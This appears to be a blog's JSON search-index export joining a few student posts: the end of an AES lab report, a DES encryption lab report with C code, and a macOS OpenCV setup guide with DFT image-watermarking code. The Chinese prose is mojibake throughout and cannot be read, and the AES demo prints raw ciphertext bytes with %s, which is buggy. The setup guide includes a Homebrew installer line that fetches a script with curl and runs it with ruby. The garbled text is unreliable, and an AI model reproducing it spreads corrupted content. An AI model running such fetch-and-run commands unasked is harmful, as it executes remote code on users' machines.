åˆ—æ··æ·†ï¼ˆMixColumnsï¼‰ï¼šå°†çŠ¶æ€é˜µåˆ—è§†ä¸ºå¤šé¡¹å¼ï¼Œä¸å›ºå®šå¤šé¡¹å¼è¿›è¡Œæ¨¡çš„ä¹˜æ³•ã€‚ä¸”è¦æ±‚å¯é€† å¯†é’¥åŠ ï¼ˆAddRoundKeyï¼‰ï¼šå°†è½®å¯†é’¥ä¸çŠ¶æ€è¿›è¡Œé€æ¯”ç‰¹å¼‚æˆ–ã€‚é•¿åº¦&#x3D;åˆ†ç»„é•¿åº¦Nbã€‚å¯†é’¥åŠ çš„é€†è¿ç®—æ˜¯è‡ªå·±ã€‚ ç®—æ³•ä¸­é—´ç»“æœçš„åˆ†ç»„ä¸ºçŠ¶æ€ å¯†é’¥ç¼–æ’ï¼šå¯†é’¥æ‰©å±•ï¼š ç”±ç§å­å¯†é’¥æ‰©å±•ï¼Œä»¥å››å­—èŠ‚ä¸ºå…ƒç´ çš„ä¸€ç»´é˜µåˆ—ã€‚è½®å¯†é’¥çš„æ€»æ¯”ç‰¹æ•°&#x3D;Nbâœ–ï¸ï¼ˆè½®æ•° +1ï¼‰ã€‚Nkä¸ºåˆ—æ•°ï¼Œå‰Nkä¸ªå­—ä¸ºç§å­å¯†é’¥ã€‚ $$W[N_b*(N_r+1)]$$ Nkâ‰¤6: W[i]&#x3D;Nkä¸ªå­—é•¿çš„ä¸€æ®µé¦–å°¾ä¸¤ä¸ªå­—å¼‚æˆ–ï¼› ä¸ºNkæ•´å€æ—¶ï¼Œå…ˆå°†å‰ä¸€ä¸ªå­—w[i-1]è¿›è¡Œå˜æ¢ï¼šä¸€å­—èŠ‚å¾ªç¯ç§»ä½RotByte â†’ Sç›’SubByte â†’ å¼‚æˆ–å¸¸æ•°Rcon[i&#x2F;Nk] Nk&gt;6: Nkæ•´å€æ•°ä¿æŒä¸€è‡´ã€‚ é™¤Nkä½™4æ—¶ï¼Œw[i-1]æ‰§è¡ŒSubByte è½®å¯†é’¥é€‰å–ï¼š è½®å‡½æ•°çš„é€‰å–ï¼Œä»æ‰©å±•å¯†é’¥ä¸­é€‰æ¯è½®é€‰Nbé•¿åº¦çš„ï¼Œå¦‚æ­¤å¾€å¤ã€‚ å…­ã€è°ƒè¯•è¿‡ç¨‹åŠç»“æœï¼ˆé™„æˆªå›¾ï¼‰â­ï¸è¿è¡Œæ—¶é‡åˆ°ï¼šThis file does not belong to any project target code insight åœ¨cmakeæ–‡ä»¶ä¸­ï¼Œadd_executableæŠŠfields.cppæ·»åŠ è¿›å» 1âœ¨âœ¨ **è°ƒè¯•æˆåŠŸâœ¨âœ¨** 1âœ¨âœ¨**è¿è¡Œç»“æœ**âœ¨âœ¨ â˜€ï¸â˜€ï¸ä¿®æ”¹äº†mainéƒ¨åˆ†ï¼Œä»¥å­—ç¬¦å½¢å¼è¾“å‡º 1234567891011121314151617181920212223242526272829303132int main()&#123; unsigned char p[16] = &quot;HHelloWorldFine&quot;; unsigned char k[16] = &#123;0x1d,0x25,0xc9,0xf2,0xf4,0x17,0xc4,0x1b,0xcf,0x19,0x02,0x02,0x1f,0x1c,0xf0,0x11&#125; ; unsigned char c[16] ; unsigned char rk[11][16] ; unsigned char pp[16] ; KeyExpansion(k,rk) ; printf(&quot;éœ€åŠ å¯†çš„æ˜æ–‡æ˜¯:\\\\t&quot;) ;// for( int i = 0 ; i &lt; 16 ; i ++ )// printf(&quot;%02x,&quot;,p[i]); printf(&quot;%s&quot;,&amp;p) ; printf(&quot;\\\\n&quot;) ; AES(p,c,rk,10) ; printf(&quot;åŠ å¯†åçš„å¯†æ–‡æ˜¯:\\\\t&quot;) ;// for( int j = 0 ; j &lt; 16 ; j ++ )// printf(&quot;%02x,&quot;,c[j]) ; printf(&quot;%s&quot;,&amp;c); printf(&quot;\\\\n&quot;) ; InvAES(c,pp,rk,10) ; printf(&quot;è§£å¯†åçš„æ˜æ–‡æ˜¯:\\\\t&quot;) ;// for( int m = 0 ; m &lt; 16 ; m ++ )// printf(&quot;%02x,&quot;,pp[m]) ; printf(&quot;%s&quot;,&amp;pp); printf(&quot;\\\\n&quot;) ; return 0 ;&#125; ä¸ƒã€æ€»ç»“ä½“ä¼šâ“ä»£ç å¦‚ä½•è¿›è¡Œæœ‰é™åŸŸçš„ä¹˜æ³•ï¼Ÿ ç¬¬1æ­¥å°†æ•°å­—è½¬æ¢æˆå¤šé¡¹å¼è¡¨è¾¾å¼ï¼›ç¬¬2æ­¥æ˜¯å¸¸è§„çš„ä¹˜æ³•è¿ç®—ï¼Œå³å°†å¤šé¡¹å¼ä¹˜æ³•å±•å¼€ï¼› ç¬¬3æ­¥ä¸æ—¢çº¦å¤šé¡¹å¼ï¼› xtime(Â·)ç®—æ³•ï¼š æ±‚ä¸€ä¸ªæ•°xä¸0x02çš„ä¹˜ç§¯ï¼Œä¸€èˆ¬æ±‚ä¸€ä¸ªæ•°çš„2å€ï¼Œéƒ½æ˜¯å·¦ç§»ä¸€ä½ï¼Œåœ¨æœ‰é™åŸŸå†…ï¼Œè¦è®¡ç®—æœ‰é™åŸŸçš„ä¹˜æ³•ï¼Œå¿…é¡»å…ˆç¡®å®šä¸€ä¸ªGFä¸Šçš„8æ¬¡ä¸å¯çº¦å¤šé¡¹å¼ï¼ŒRijndaelå¯†ç ä¸­ï¼Œè¿™ä¸ªå¤šé¡¹å¼ç¡®å®šä¸ºx^8+x^4+x^3+x+1 åœ¨äºŒè¿›åˆ¶ä¸­ï¼Œæ‰€æœ‰çš„æ•°éƒ½èƒ½ç”¨0x01,0x02,0x04,0x08,0x10,0x20,0x40,0x80å¼‚æˆ–å¾—åˆ°ï¼Œ0x01,0x02,0x04,0x08,0x10,0x20,0x40,0x80çš„äºŒè¿›åˆ¶è¡¨ç¤ºå¦‚ä¸‹ï¼š è€Œä»»ä½•ä¸€ä¸ªæ•°xå’Œaç›¸ä¹˜éƒ½å¯ä»¥è¡¨ç¤ºä¸º $$x *a&#x3D;x(08\\oplus02\\oplus04\\oplus01\\oplus80ï¼‰$$ è®¡ç®—å‡ºï¼šåˆ™æ‰€æœ‰ä¹˜æ³•ç»“æœéƒ½å¯ä»¥å¾—åˆ° è¿™ç§æ–¹å¼ï¼Œå¯ä»¥ç”¨çŸ©é˜µè¡¨ç¤ºå‡ºæ¥ 1234567891011121314151617181920212223////*****************************åˆ—æ··åˆ*********************************////void MixColumns( unsigned char *a )&#123; unsigned char b[16] ; b[ 0] = S2[a[ 0]] ^ S3[a[ 1]] ^ a[ 2] ^ a[ 3] ; b[ 1] = S2[a[ 1]] ^ S3[a[ 2]] ^ a[ 3] ^ a[ 0] ; b[ 2] = S2[a[ 2]] ^ S3[a[ 3]] ^ a[ 0] ^ a[ 1] ; b[ 3] = S2[a[ 3]] ^ S3[a[ 0]] ^ a[ 1] ^ a[ 2] ; b[ 4] = S2[a[ 4]] ^ S3[a[ 5]] ^ a[ 6] ^ a[ 7] ; b[ 5] = S2[a[ 5]] ^ S3[a[ 6]] ^ a[ 7] ^ a[ 4] ; b[ 6] = S2[a[ 6]] ^ S3[a[ 7]] ^ a[ 4] ^ a[ 5] ; b[ 7] = S2[a[ 7]] ^ S3[a[ 4]] ^ a[ 5] ^ a[ 6] ; b[ 8] = S2[a[ 8]] ^ S3[a[ 9]] ^ a[10] ^ a[11] ; b[ 9] = S2[a[ 9]] ^ S3[a[10]] ^ a[11] ^ a[ 8] ; b[10] = S2[a[10]] ^ S3[a[11]] ^ a[ 8] ^ a[ 9] ; b[11] = S2[a[11]] ^ S3[a[ 8]] ^ a[ 9] ^ a[10] ; b[12] = S2[a[12]] ^ S3[a[13]] ^ a[14] ^ a[15] ; b[13] = S2[a[13]] ^ S3[a[14]] ^ a[15] ^ a[12] ; b[14] = S2[a[14]] ^ S3[a[15]] ^ a[12] ^ a[13] ; b[15] = S2[a[15]] ^ S3[a[12]] ^ a[13] ^ a[14] ; for( int i = 0 ; i &lt; 16 ; i ++ ) a[i] = b[i] ;&#125;","categories":[{"name":"å®éªŒ","slug":"å®éªŒ","permalink":"https://gryffinbit.top/categories/%E5%AE%9E%E9%AA%8C/"},{"name":"å¯†ç å­¦","slug":"å®éªŒ/å¯†ç å­¦","permalink":"https://gryffinbit.top/categories/%E5%AE%9E%E9%AA%8C/%E5%AF%86%E7%A0%81%E5%AD%A6/"}],"tags":[{"name":"AES","slug":"AES","permalink":"https://gryffinbit.top/tags/AES/"}],"author":"Gryffinbit"},{"title":"DESå®éªŒæŠ¥å‘Š","slug":"DESå®éªŒ","date":"2020-11-14T18:53:19.000Z","updated":"2024-11-12T06:59:45.000Z","comments":true,"path":"2020/11/15/DESå®éªŒ/","permalink":"https://gryffinbit.top/2020/11/15/DES%E5%AE%9E%E9%AA%8C/","excerpt":"","text":"DESå®éªŒæŠ¥å‘Šä¸€ã€å®éªŒé¢˜ç›®DESåŠ å¯†ç®—æ³• äºŒã€å®éªŒç›®çš„å’Œè¦æ±‚é€šè¿‡å®éªŒï¼ŒæŒæ¡DESå¯†ç çš„ç¨‹åºå®ç°ï¼Œç†Ÿæ‚‰æ¯”ç‰¹ä¸²çš„æ“ä½œï¼ŒçŸ©é˜µå˜æ¢ï¼Œæé«˜C++ç¨‹åºè®¾è®¡èƒ½åŠ›ã€‚ ç¼–å†™ DES å¯†ç çš„åŠ å¯†è§£å¯†ç¨‹åºï¼Œè¿è¡Œå¹¶éªŒè¯ã€‚ (1) è¾“å…¥ 64 æ¯”ç‰¹æ˜æ–‡å’Œå¯†æ–‡ï¼Œåˆ©ç”¨ DES å¯†ç å¯¹å…¶åŠ å¯†å¹¶è¾“å‡ºå¯†æ–‡ã€‚ (2) è¾“å…¥ DES åŠ å¯†çš„ 64 æ¯”ç‰¹å¯†æ–‡å’Œå¯†é’¥ï¼Œå¯¹å…¶è¿›è¡Œè§£å¯†ã€‚ (3) è®°å½•è°ƒè¯•å’ŒéªŒè¯è¿‡ç¨‹ï¼Œå®Œæˆå®éªŒæŠ¥å‘Šã€‚ ä¸‰ã€å®éªŒç¯å¢ƒclion å››ã€å®éªŒå†…å®¹DES ç®—æ³•åŒ…æ‹¬ï¼š (1)ï¼šä¸€ä¸ªåˆå§‹ç½®æ¢ IPï¼šé‡æ’æ˜æ–‡åˆ†ç»„çš„ 64 æ¯”ç‰¹æ•°æ® (2)ï¼šç›¸åŒåŠŸèƒ½çš„ 16 è½®å˜æ¢ï¼šæ¯è½®ä¸­éƒ½æœ‰ç½®æ¢å’Œä»£æ¢è¿ç®—ï¼Œç¬¬ 16 è½®å˜æ¢çš„è¾“å‡º åˆ†ä¸ºå·¦å³ä¸¤åŠï¼Œå¹¶è¢«äº¤æ¢æ¬¡åº (3)ï¼šç»è¿‡ä¸€ä¸ªé€†åˆå§‹ç½®æ¢ IP-1(ä¸º IP çš„é€†)ã€‚æœ€åäº§ç”Ÿ 64 æ¯”ç‰¹çš„å¯†æ–‡ã€‚ ç»™å®šçš„ DES ç»“æ„å¦‚å›¾ï¼š æ¯è½®çš„ç»“æ„å¦‚å›¾ï¼š 32 æ¯”ç‰¹æ‰©å±• 48 ä½ï¼Œ è½®å¯†é’¥å¼‚æˆ–ï¼Œ S ç›’ä»£æ¢ï¼ˆ1ï¼Œ6 ä½åˆå¹¶é€‰è¡Œï¼Œ2-5 ä½åˆå¹¶é€‰åˆ—ï¼‰ï¼Œ ç½®æ¢ P è½®å¯†é’¥ç”Ÿæˆï¼š è¾“å…¥ç®—æ³•çš„ 56 æ¯”ç‰¹æœ‰æ•ˆå¯†é’¥: 1.é¦–å…ˆç»è¿‡ä¸€ä¸ªç½®æ¢è¿ç®—ï¼ˆå®é™…åˆå§‹å¯†é’¥å…± 64 ä½ï¼Œå»é™¤ 8 ä¸ªæ ¡éªŒä½å¹¶ä¸”æ”¹å˜ é¡ºåºï¼‰ï¼Œ 2.ç„¶åå°†ç½®æ¢åçš„ 56 æ¯”ç‰¹åˆ†ä¸ºå„ä¸º 28 æ¯”ç‰¹çš„ğ¶ğ¶0å’Œğ·ğ·0ä¸¤åŠã€‚ç¬¬ğ‘–ğ‘–è½®ğ¶ğ¶ğ‘–ğ‘–âˆ’1å’Œğ·ğ·ğ‘–ğ‘–âˆ’1ï¼Œåˆ†åˆ«å·¦å¾ªç¯ç§»ä½ã€‚å¾—åˆ°ğ¶ğ¶ğ‘–ğ‘–å’Œå’Œğ·ğ·ğ‘–ğ‘–âˆ’1 åšä¸ºæ±‚ä¸‹ä¸€è½®å­å¯†é’¥çš„è¾“å…¥ï¼ŒåŒæ—¶ä¹Ÿè¾“å…¥ç½®æ¢é€‰æ‹© 2ã€‚ 3.ç½®æ¢é€‰æ‹© 2 äº§ç”Ÿçš„ 48 æ¯”ç‰¹çš„ ï¼Œå³ä¸ºæœ¬è½®çš„å­å¯†é’¥ï¼Œè¾“å…¥å‡½æ•°ã€‚ éªŒè¯æ“ä½œ ï¼š é€‰æ‹©è¿›è¡Œæ–‡ä»¶åŠ å¯†ï¼Œè¾“å…¥é•¿åº¦ä¸º 8 ä¸ªå­—ç¬¦çš„åŠ è§£å¯†çš„å¯†é’¥ï¼Œè¯»å…¥æ˜æ–‡æ–‡ä»¶ 1.txtï¼ŒåŠ å¯†æ–‡ä»¶å­˜å‚¨åœ¨ 2.txt æ–‡ä»¶ä¸­ï¼› é€‰æ‹©è¿›è¡Œæ–‡ä»¶è§£å¯†ï¼Œè¾“å…¥é•¿åº¦ä¸º 8 ä¸ªå­—ç¬¦çš„åŠ è§£å¯†çš„å¯†é’¥ï¼Œè¯»å…¥å¯†æ–‡æ–‡ä»¶ 2.txtï¼Œè§£å¯†æ–‡ä»¶å­˜å‚¨åœ¨ 3.txt æ–‡ä»¶ä¸­ã€‚ äº”ã€ç®—æ³•æè¿°åŠå®éªŒæ­¥éª¤å‡†å¤‡éƒ¨åˆ†çš„çŸ©é˜µï¼šåˆå§‹ç½®æ¢IPï¼Œé€†åˆå§‹ç½®æ¢IPï¼ŒEè¡¨ï¼Œç½®æ¢å‡½æ•°Pã€‚ Fä¸­çš„ä»£æ¢ç”±8ä¸ªSç›’ç»„æˆã€‚64æ¯”ç‰¹å¯†é’¥è¿›è¡Œç¬¬ä¸€è½®ç½®æ¢é€‰æ‹©ï¼Œå˜ä¸º56æ¯”ç‰¹çš„æœ‰æ•ˆå¯†é’¥ã€‚åˆ†æˆä¸¤ç»„åï¼Œå·¦ç§»ä½ï¼Œå†è¿›å…¥ç½®æ¢é€‰æ‹©2. å°†å­—ç¬¦è½¬ä¸ºäºŒè¿›åˆ¶çš„å½¢å¼ï¼Œä¸å¯†é’¥å‚ä¸å¼‚æˆ–è¿ç®— DESæ˜æ–‡å¤„ç†çš„è¿‡ç¨‹æœ‰ä¸‰ä¸ªé˜¶æ®µï¼š 1.åˆå§‹ç½®æ¢IPï¼šé‡æ’æ˜æ–‡åˆ†ç»„çš„64æ¯”ç‰¹æ•°æ® 2.16è½®å˜æ¢ï¼šæ¯è½®ä¸­åŒ…å«ç½®æ¢ã€ä»£æ¢ã€‚å˜æ¢çš„è¾“å‡ºè¢«åˆ†ä¸ºå·¦å³ä¸¤ç»„ï¼Œè¢«äº¤æ¢æ¬¡åº 3.é€†åˆå§‹ç½®æ¢IPï¼Œäº§ç”Ÿå¯†æ–‡ DESå¯†é’¥ç”Ÿæˆï¼š 1.56æ¯”ç‰¹å¯†é’¥ç»è¿‡ç½®æ¢ 2.å°†ç½®æ¢åçš„56æ¯”ç‰¹ï¼Œåˆ†ä¸ºä¸¤ç»„ï¼ŒCiã€Diã€‚ 3.ç¬¬iè½®Ci-1ã€Di-1åˆ†åˆ«å·¦ç§»ä½ã€‚å¾—åˆ°çš„Ciã€Diä½œä¸ºä¸‹ä¸€è½®æ±‚å­å¯†é’¥çš„è¾“å…¥ï¼ŒåŒæ—¶è¾“å…¥ç½®æ¢é€‰æ‹©2 4.ç½®æ¢é€‰æ‹©2ç”Ÿæˆ48æ¯”ç‰¹å­å¯†é’¥Kiï¼Œè¾“å…¥åˆ°Få‡½æ•° è½®ç»“æ„ï¼š $$L_i&#x3D;R_{i-1}$$ $$R_i&#x3D;L_{i-1}\\oplus F(R_{i-1},K_i)$$ Fçš„å¤„ç†è¿‡ç¨‹ï¼š $$(R_{i-1}æ‰©å±•&#x2F;ç½®æ¢ï¼ˆEè¡¨ï¼‰\\oplus K_i)\\ è¿›å…¥Sç›’ï¼Œå˜ä¸º32æ¯”ç‰¹ã€‚ç½®æ¢ï¼ˆPï¼‰ï¼Œ$$ å…­ã€è°ƒè¯•è¿‡ç¨‹åŠç»“æœï¼ˆé™„æˆªå›¾ï¼‰ ä¸ƒã€æ€»ç»“ä½“ä¼šâ“ä»»é€‰ä¸¤ä¸ªæ¨¡å—æè¿°æ‰§è¡Œè¿‡ç¨‹ â€¼ï¸æ˜æ–‡çš„å¤„ç†ï¼š å°†å­—ç¬¦è½¬æ¢ä¸ºäºŒè¿›åˆ¶ï¼Œåé¢æ–¹ä¾¿ä¸å¯†é’¥è¿›è¡Œå¼‚æˆ–è¿ç®— 1234567int ISD_DES_ByteToBit(ElemType ch, ElemType bit[8])&#123; int cnt; for(cnt = 0;cnt &lt; 8; cnt++)&#123; *(bit+cnt) = (ch&gt;&gt;cnt)&amp;1; &#125; return 0;&#125; ä¸€å­—èŠ‚é•¿åº¦ä¸º8æ¯”ç‰¹ï¼šå°†å…¶è½¬æ¢ä¸ºäºŒè¿›åˆ¶ä¸² 123456int ISD_DES_Char8ToBit64(ElemType ch[8],ElemType bit[64])&#123; int cnt; for(cnt = 0; cnt &lt; 8; cnt++)&#123; ISD_DES_ByteToBit(*(ch+cnt),bit+(cnt&lt;&lt;3)); &#125; return 0; â€¼ï¸æ˜æ–‡çš„åŠ å¯†ï¼š 1.åˆå§‹ç½®æ¢IPï¼šé‡æ’æ˜æ–‡åˆ†ç»„çš„64æ¯”ç‰¹æ•°æ® 2.16è½®å˜æ¢ï¼šæ¯è½®ä¸­åŒ…å«ç½®æ¢ã€ä»£æ¢ã€‚å˜æ¢çš„è¾“å‡ºè¢«åˆ†ä¸ºå·¦å³ä¸¤ç»„ï¼Œè¢«äº¤æ¢æ¬¡åº 3.é€†åˆå§‹ç½®æ¢IPï¼Œäº§ç”Ÿå¯†æ–‡ 1234567891011121314151617181920212223242526272829303132int ISD_DES_EncryptBlock(ElemType plainBlock[8], ElemType subKeys[16][48], ElemType cipherBlock[8])&#123; ElemType plainBits[64]; ElemType copyRight[48]; int cnt; ISD_DES_Char8ToBit64(plainBlock,plainBits); //åˆå§‹ç½®æ¢ï¼ˆIPç½®æ¢ï¼‰ ISD_DES_IP_Transform(plainBits); //16è½®è¿­ä»£ for(cnt = 0; cnt &lt; 16; cnt++)&#123; memcpy(copyRight,plainBits+32,32); //å°†å³åŠéƒ¨åˆ†è¿›è¡Œæ‰©å±•ç½®æ¢ï¼Œä»32ä½æ‰©å±•åˆ°48ä½ ISD_DES_E_Transform(copyRight); //å°†å³åŠéƒ¨åˆ†ä¸å­å¯†é’¥è¿›è¡Œå¼‚æˆ–æ“ä½œ ISD_DES_XOR(copyRight,subKeys[cnt],48); //å¼‚æˆ–ç»“æœè¿›å…¥Sç›’ï¼Œè¾“å‡º32ä½ç»“æœ ISD_DES_SBOX(copyRight); //Pç½®æ¢ ISD_DES_P_Transform(copyRight); //å°†æ˜æ–‡å·¦åŠéƒ¨åˆ†ä¸å³åŠéƒ¨åˆ†è¿›è¡Œå¼‚æˆ– ISD_DES_XOR(plainBits,copyRight,32); if(cnt != 15)&#123; //æœ€ç»ˆå®Œæˆå·¦å³éƒ¨çš„äº¤æ¢ ISD_DES_Swap(plainBits,plainBits+32); &#125; &#125; //é€†åˆå§‹ç½®æ¢ï¼ˆIP^1ç½®æ¢ï¼‰ ISD_DES_IP_1_Transform(plainBits); ISD_DES_Bit64ToChar8(plainBits,cipherBlock); return 0;&#125;","categories":[{"name":"å®éªŒ","slug":"å®éªŒ","permalink":"https://gryffinbit.top/categories/%E5%AE%9E%E9%AA%8C/"},{"name":"å¯†ç å­¦","slug":"å®éªŒ/å¯†ç å­¦","permalink":"https://gryffinbit.top/categories/%E5%AE%9E%E9%AA%8C/%E5%AF%86%E7%A0%81%E5%AD%A6/"}],"tags":[{"name":"DES","slug":"DES","permalink":"https://gryffinbit.top/tags/DES/"}],"author":"Gryffinbit"},{"title":"OpenCv","slug":"OpenCv","date":"2020-11-14T17:47:14.000Z","updated":"2024-08-27T02:28:08.000Z","comments":true,"path":"2020/11/15/OpenCv/","permalink":"https://gryffinbit.top/2020/11/15/OpenCv/","excerpt":"","text":"macOSä¸‹opencvçš„å®‰è£…ã€‚åœ¨CLionä¸Šé…ç½®ä½¿ç”¨OpenCV ï¼ˆC++ï¼‰å®‰è£…opencv brewçš„å®‰è£… 1/usr/bin/ruby -e &quot;$(curl -fsSL &lt;https://raw.githubusercontent.com/Homebrew/install/master/install&gt;)&quot; brewå®‰è£…opencv 1brew install opencv 123456789101112cmake_minimum_required(VERSION 3.17)project(opencv)set(CMAKE_CXX_STANDARD 11)find_package(OpenCV REQUIRED)include_directories($&#123;OpenCV_INCLUDE_DIRS&#125;)add_executable(opencv main.cpp) target_link_libraries(opencv $&#123;OpenCV_LIBS&#125;) 123456cd &quot;$(brew --repo)&quot;git remote set-url origin &lt;https://mirrors.tuna.tsinghua.edu.cn/git/homebrew/brew.git&gt;cd &quot;$(brew --repo)/Library/Taps/homebrew/homebrew-core&quot;git remote set-url origin &lt;https://mirrors.tuna.tsinghua.edu.cn/git/homebrew/homebrew-core.git&gt;cd brew update 12brew updatebrew install opencv 1brew install libav 1234567891011cmake_minimum_required(VERSION 3.17)project(watermark_C__14)find_package(OpenCV)include_directories($&#123;OpenCV_INCLUDE_DIRS&#125;)set(CMAKE_CXX_STANDARD 14)set(SOURCE_FILES main.cpp)add_executable(watermark_C__14 $&#123;SOURCE_FILES&#125;)target_link_libraries(watermark_C__14 $&#123;OpenCV_LIBS&#125;) # é“¾æ¥åº“ 1/usr/local/Cellar/gcc 1preferences &gt;&gt; Build,execution,deployment &gt;&gt; toolchains &gt;&gt; GCC 1brew install opencv@3 1234567891011121314151617181920#include &lt;iostream&gt;#include &lt;opencv2/opencv.hpp&gt; //è°ƒç”¨ OpenCV çš„åº“using namespace cv;int main()&#123; Mat image; // OpenCV ä¸­å›¾ç‰‡æ ¼å¼ä¸º Mat image = imread( &quot;è¦æ˜¾ç¤ºçš„å›¾ç‰‡è·¯å¾„.png&quot;); //è¯»å–å›¾ç‰‡ if( image.empty() ) //æ£€æŸ¥æ˜¯å¦è¯»å–æˆåŠŸ &#123; std::cout &lt;&lt; &quot;Could not open or find the image&quot; &lt;&lt; std::endl ; return -1; &#125; imshow(&quot;demo&quot;,image); //æ˜¾ç¤ºå›¾ç‰‡ waitKey(); return 0;&#125; 12345678void test()&#123; std::cout &lt;&lt; CV_VERSION_MAJOR &lt;&lt; CV_VERSION_MINOR &lt;&lt; std::endl; std::cout &lt;&lt; cv::getBuildInformation().c_str() &lt;&lt; std::endl;&#125;int main()&#123; test();&#125; 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200#include &lt;stdlib.h&gt;#include &lt;opencv2/core/utility.hpp&gt;#include &lt;opencv2/tracking.hpp&gt;#include &lt;opencv2/videoio.hpp&gt;#include &lt;opencv2/highgui.hpp&gt;#include &quot;opencv2/imgproc/types_c.h&quot;using namespace cv;std::vector&lt;cv::Mat&gt; planes;cv::Mat complexImage;void shiftDFT(cv::Mat image)&#123; image = image(Rect(0, 0, image.cols &amp; -2, image.rows &amp; -2)); int cx = image.cols / 2; int cy = image.rows / 2; Mat q0 = Mat(image, Rect(0, 0, cx, cy)); Mat q1 = Mat(image, Rect(cx, 0, cx, cy)); Mat q2 = Mat(image, Rect(0, cy, cx, cy)); Mat q3 = Mat(image, Rect(cx, cy, cx, cy)); cv::Mat tmp = cv::Mat(); q0.copyTo(tmp); q3.copyTo(q0); tmp.copyTo(q3); q1.copyTo(tmp); q2.copyTo(q1); tmp.copyTo(q2);&#125;cv::Mat optimizeImageDim(cv::Mat image)&#123; // init cv::Mat padded; // get the optimal rows size for dft int addPixelRows = cv::getOptimalDFTSize(image.rows); // get the optimal cols size for dft int addPixelCols = cv::getOptimalDFTSize(image.cols); // apply the optimal cols and rows size to the image cv::copyMakeBorder(image, padded, 0, addPixelRows - image.rows, 0, addPixelCols - image.cols, cv::BORDER_CONSTANT, Scalar::all(0)); return padded;&#125;cv::Mat createOptimizedMagnitude(cv::Mat complexImage)&#123; // init std::vector&lt;cv::Mat&gt; newPlanes; cv::Mat mag = cv::Mat(); // split the comples image in two planes cv::split(complexImage, newPlanes); // compute the magnitude cv::magnitude(newPlanes[0], newPlanes[1], mag); // move to a logarithmic scale cv::add(cv::Mat::ones(mag.size(), CV_32F), mag, mag); cv::log(mag, mag); // optionally reorder the 4 quadrants of the magnitude image shiftDFT(mag); // normalize the magnitude image for the visualization since both JavaFX // and OpenCV need images with value between 0 and 255 // convert back to CV_8UC1 mag.convertTo(mag, CV_8UC1); cv::normalize(mag, mag, 0, 255, cv::NORM_MINMAX, CV_8UC1); return mag;&#125;cv::Mat transformImage(cv::Mat image)&#123; // planes??????????????,???. if (!planes.empty()) &#123; planes.clear(); &#125; // optimize the dimension of the loaded image cv::Mat padded = optimizeImageDim(image); padded.convertTo(padded, CV_32F); // prepare the image planes to obtain the complex image planes.push_back(padded); planes.push_back(cv::Mat::zeros(padded.size(), CV_32F)); // prepare a complex image for performing the dft cv::merge(planes, complexImage); // dft printf(&quot;complexImage types %d\\\\n&quot;, complexImage.type()); cv::dft(complexImage, complexImage); // optimize the image resulting from the dft operation cv::Mat magnitude = createOptimizedMagnitude(complexImage); planes.clear(); return magnitude;&#125;void transformImageWithText(cv::Mat image, String watermarkText, cv::Point point, double fontSize, Scalar scalar)&#123; // planes??????????????,???. if (!planes.empty()) &#123; planes.clear(); &#125; // optimize the dimension of the loaded image cv::Mat padded = optimizeImageDim(image); padded.convertTo(padded, CV_32F); printf(&quot;padded types %d CV_32FC1 %d\\\\n&quot;, padded.type(), CV_32F); // prepare the image planes to obtain the complex image planes.push_back(padded); planes.push_back(cv::Mat::zeros(padded.size(), CV_32F)); // prepare a complex image for performing the dft cv::merge(planes, complexImage); printf(&quot;complexImage types %d\\\\n&quot;, complexImage.type()); // dft cv::dft(complexImage, complexImage); // ???????? cv::putText(complexImage, watermarkText, point, cv::FONT_HERSHEY_DUPLEX, fontSize, scalar,2); cv::flip(complexImage, complexImage, -1); cv::putText(complexImage, watermarkText, point, cv::FONT_HERSHEY_DUPLEX, fontSize, scalar,2); cv::flip(complexImage, complexImage, -1); planes.clear();&#125;cv::Mat antitransformImage()&#123; cv::Mat invDFT = cv::Mat(); cv::idft(complexImage, invDFT, cv::DFT_SCALE | cv::DFT_REAL_OUTPUT, 0); cv::Mat restoredImage = cv::Mat(); invDFT.convertTo(restoredImage, CV_8U); planes.clear(); return restoredImage;&#125;int main(int argc, char* argv[])&#123; if (argc &lt; 3) &#123; printf(&quot;watermark enc/dec file_name\\\\n&quot;); &#125; else &#123; if (strcmp(argv[1], &quot;enc&quot;) == 0) &#123; //load image Point point(50, 100); Scalar scalar(0, 0, 0, 0); printf(&quot;read file %s\\\\n&quot;, argv[2]); cv::Mat img1 = cv::imread(argv[2], cv::IMREAD_GRAYSCALE); transformImageWithText(img1, &quot;shennug&quot;, point, 2.0, scalar); cv::Mat img2 = createOptimizedMagnitude(complexImage); cv::Mat img3 = antitransformImage(); cv::namedWindow(&quot;Matrix1&quot;, cv::WINDOW_AUTOSIZE); cv::imshow(&quot;Matrix1&quot;, img1); cv::namedWindow(&quot;Matrix2&quot;, cv::WINDOW_AUTOSIZE); cv::imshow(&quot;Matrix2&quot;, img2); cv::namedWindow(&quot;Matrix3&quot;, cv::WINDOW_AUTOSIZE); cv::imshow(&quot;Matrix3&quot;, img3); cv::imwrite(&quot;1_orig.jpg&quot;, img1); cv::imwrite(&quot;1_watermark.jpg&quot;, img2); cv::waitKey(0); cv::destroyAllWindows(); &#125; if (strcmp(argv[1], &quot;dec&quot;) == 0) &#123; //load image Point point(50, 100); Scalar scalar(0, 0, 0, 0); printf(&quot;read file %s\\\\n&quot;, argv[2]); cv::Mat img1 = cv::imread(argv[2], cv::IMREAD_GRAYSCALE); transformImage(img1); cv::Mat img2 = createOptimizedMagnitude(complexImage); cv::Mat img3 = antitransformImage(); cv::namedWindow(&quot;Matrix1&quot;, cv::WINDOW_AUTOSIZE); cv::imshow(&quot;Matrix1&quot;, img1); cv::namedWindow(&quot;Matrix2&quot;, cv::WINDOW_AUTOSIZE); cv::imshow(&quot;Matrix2&quot;, img2); cv::imwrite(&quot;1_decode.jpg&quot;, img2); cv::waitKey(0); cv::destroyAllWindows(); &#125; &#125; return 1;&#125; 1ln -s -f /usr/local/bin/python3.8 /usr/local/bin/python ln -s -f &#x2F;usr&#x2F;local&#x2F;bin&#x2F;pip3 &#x2F;usr&#x2F;local&#x2F;bin&#x2F;pip pip install opencv-python pip install -i https://pypi.tuna.tsinghua.edu.cn/simple opencv-python pythonä¸å¥½ç”¨çš„åŠ æ°´å°C++brew reinstall llvm Please note that, you canâ€™t use gcc compiler on Mac-Sierra for your project which needs openMP and also openCV. You need to use llvm compiler. æŠ¥é”™æ’æŸ¥ nm -g /usr/local/lib/libopencv_imgcodecs.dylib | grep imwrite 0000000000006223 T 